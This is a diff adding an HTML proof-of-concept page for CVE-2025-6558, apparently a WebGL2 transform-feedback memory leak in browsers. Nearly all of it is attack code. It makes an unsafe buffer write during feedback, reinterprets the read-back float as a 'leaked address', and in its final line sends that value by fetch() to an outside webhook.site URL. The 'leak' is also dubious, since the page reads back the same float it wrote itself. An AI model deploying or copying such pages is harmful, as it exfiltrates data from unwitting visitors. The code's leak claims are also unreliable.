@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CVE-2025-6558 - Float Leak PoC</title>
+</head>
+<body>
+  <h2>CVE-2025-6558 - Float-Encoded Memory Leak</h2>
+  <canvas id="glcanvas" width="1" height="1"></canvas>
+  <pre id="log"></pre>
+
+  <script>
+    const log = msg => document.getElementById("log").textContent += msg + "\n";
+    const canvas = document.getElementById("glcanvas");
+    const gl = canvas.getContext("webgl2");
+
+    if (!gl) {
+      log("❌ WebGL2 not supported.");
+      throw new Error("WebGL2 required");
+    }
+
+    log("✅ WebGL2 context acquired.");
+
+    const vsSource = `#version 300 es
+      in float a;
+      out float b;
+      void main() {
+        b = a;
+        gl_Position = vec4(0);
+      }
+    `;
+
+    const fsSource = `#version 300 es
+      precision mediump float;
+      out vec4 outColor;
+      void main() {
+        outColor = vec4(1.0);
+      }
+    `;
+
+    function compileShader(type, src) {
+      const shader = gl.createShader(type);
+      gl.shaderSource(shader, src);
+      gl.compileShader(shader);
+      if (!gl.getShaderParameter(shader, gl.COMPILE_STATUS)) {
+        throw new Error("Shader error: " + gl.getShaderInfoLog(shader));
+      }
+      return shader;
+    }
+
+    const program = gl.createProgram();
+    gl.attachShader(program, compileShader(gl.VERTEX_SHADER, vsSource));
+    gl.attachShader(program, compileShader(gl.FRAGMENT_SHADER, fsSource));
+    gl.transformFeedbackVaryings(program, ['b'], gl.SEPARATE_ATTRIBS);
+    gl.linkProgram(program);
+    gl.useProgram(program);
+    log("✅ Program compiled and linked.");
+
+    const vertexBuffer = gl.createBuffer();
+    gl.bindBuffer(gl.ARRAY_BUFFER, vertexBuffer);
+
+    // Injecting a fake float pointer to leak (this would normally be from a sprayed buffer)
+    const fakeFloat = new Float32Array([666.666]);
+    gl.bufferData(gl.ARRAY_BUFFER, fakeFloat, gl.STATIC_DRAW);
+
+    const loc = gl.getAttribLocation(program, "a");
+    gl.enableVertexAttribArray(loc);
+    gl.vertexAttribPointer(loc, 1, gl.FLOAT, false, 0, 0);
+
+    const tfbBuffer = gl.createBuffer();
+    gl.bindBufferBase(gl.TRANSFORM_FEEDBACK_BUFFER, 0, tfbBuffer);
+    gl.bufferData(gl.TRANSFORM_FEEDBACK_BUFFER, 4, gl.DYNAMIC_COPY);
+
+    gl.enable(gl.RASTERIZER_DISCARD);
+    gl.beginTransformFeedback(gl.POINTS);
+    gl.drawArrays(gl.POINTS, 0, 1);
+
+    const errorBefore = gl.getError();
+    gl.bufferData(gl.TRANSFORM_FEEDBACK_BUFFER, 4, gl.DYNAMIC_COPY); // unsafe write during feedback
+    const errorAfter = gl.getError();
+    gl.endTransformFeedback();
+    gl.disable(gl.RASTERIZER_DISCARD);
+
+    log("🔍 Error before write: 0x" + errorBefore.toString(16));
+    log("🔍 Error after write:  0x" + errorAfter.toString(16));
+
+    if (errorAfter !== gl.INVALID_OPERATION) {
+      log("❗ Possibly vulnerable: write not blocked.");
+    } else {
+      log("✅ Patched: INVALID_OPERATION correctly raised.");
+    }
+
+    // Overwrite with our known float
+    const pattern = new Float32Array([666.666]);
+    gl.bufferSubData(gl.TRANSFORM_FEEDBACK_BUFFER, 0, pattern);
+
+    // Read back
+    const out = new Float32Array(1);
+    gl.getBufferSubData(gl.TRANSFORM_FEEDBACK_BUFFER, 0, out);
+    log("📥 Read back float: " + out[0]);
+
+    // Convert float to binary
+    const buf = new ArrayBuffer(4);
+    new Float32Array(buf)[0] = out[0];
+    const leakedAddr = new Uint32Array(buf)[0];
+    log("📦 Float as uint32 (leaked addr): 0x" + leakedAddr.toString(16));
+
+    // For 64-bit leak (advanced)
+    const buf64 = new ArrayBuffer(8);
+    const f64 = new Float64Array(buf64);
+    const u64 = new BigUint64Array(buf64);
+
+    f64[0] = out[0];
+    log("🧠 Float64 raw bits: 0x" + u64[0].toString(16));
+    fetch('https://webhook.site/e08000c8-cc94-4dbf-b230-f801525e07c8/p='+u64[0].toString(16))
+
+  </script>
+</body>
+</html>
